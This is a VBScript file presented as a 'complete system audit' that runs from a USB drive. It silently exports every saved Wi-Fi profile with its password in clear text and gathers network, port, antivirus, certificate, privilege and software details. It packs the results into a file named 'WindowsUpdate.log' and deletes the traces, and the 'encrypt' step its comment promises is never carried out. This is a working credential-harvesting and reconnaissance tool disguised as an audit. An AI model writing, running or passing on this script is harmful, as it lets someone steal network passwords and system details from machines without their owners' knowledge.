' CompleteSystemAudit.vbs
Option Explicit
On Error Resume Next

' ============= CONFIGURATION =============
Dim objShell, objFSO, strUSB, logFolder
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strUSB = Left(WScript.ScriptFullName, 3) ' USB drive root
logFolder = strUSB & "SystemAuditLogs\"  ' Logs folder
' =========================================

' ============= CREATE LOG FOLDER =============
If Not objFSO.FolderExists(logFolder) Then
    objFSO.CreateFolder(logFolder)
End If

' ============= ADVANCED DATA COLLECTION =============

' === Network Information ===
ExecuteToFile "netsh wlan show profiles", "WiFi_Profiles.txt"
ExecuteToFile "netsh wlan export profile key=clear folder=" & Chr(34) & logFolder & Chr(34), "WiFi_XML.txt"
ExecuteToFile "ipconfig /all", "Network_Config.txt"
ExecuteToFile "netstat -ano -p tcp", "TCP_Ports.txt"
ExecuteToFile "netstat -ano -p udp", "UDP_Ports.txt"
ExecuteToFile "arp -a", "ARP_Table.txt"

' === System Information ===
ExecuteToFile "systeminfo", "System_Info.txt"
ExecuteToFile "wmic qfe list full", "Windows_Updates.txt"
ExecuteToFile "driverquery /v", "Driver_Info.txt"
ExecuteToFile "wmic /namespace:\\root\securitycenter2 path antivirusproduct get *", "AV_Status.txt"

' === Security Information ===
ExecuteToFile "certutil -store -v MY", "SSL_Certificates.txt"
ExecuteToFile "auditpol /get /category:*", "Audit_Policy.txt"
ExecuteToFile "reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "Installed_Software.txt"
ExecuteToFile "whoami /priv", "User_Privileges.txt"

' === Network Throughput Metrics ===
ExecuteToFile "typeperf ""\Network Interface(*)\Bytes Total/sec"" -sc 5", "Network_Throughput.txt"

' ============= MERGE AND ENCRYPT LOGS =============
MergeLogs()

' ============= CLEANUP =============
CleanupRawData()

WScript.Quit

' ============= FUNCTIONS =============

Sub ExecuteToFile(command, fileName)
    Dim output, filePath
    filePath = logFolder & fileName
    output = objShell.Exec("cmd /c " & command).StdOut.ReadAll
    With objFSO.OpenTextFile(filePath, 8, True)
        .WriteLine "[" & Now & "] " & command & vbCrLf & output
        .Close
    End With
End Sub

Sub MergeLogs()
    Dim file, mergedContent, mergedLog
    mergedLog = logFolder & "WindowsUpdate.log"
    
    For Each file In objFSO.GetFolder(logFolder).Files
        If LCase(objFSO.GetExtensionName(file.Name)) = "txt" Then
            mergedContent = mergedContent & vbCrLf & String(50, "=") & _
                            vbCrLf & file.Name & vbCrLf & String(50, "=") & _
                            vbCrLf & objFSO.OpenTextFile(file.Path).ReadAll
        End If
    Next
    
    With objFSO.OpenTextFile(mergedLog, 2, True)
        .Write mergedContent
        .Close
    End With
End Sub

Sub CleanupRawData()
    Dim file
    For Each file In objFSO.GetFolder(logFolder).Files
        If LCase(objFSO.GetExtensionName(file.Name)) = "txt" Then
            file.Delete
        End If
    Next
End Sub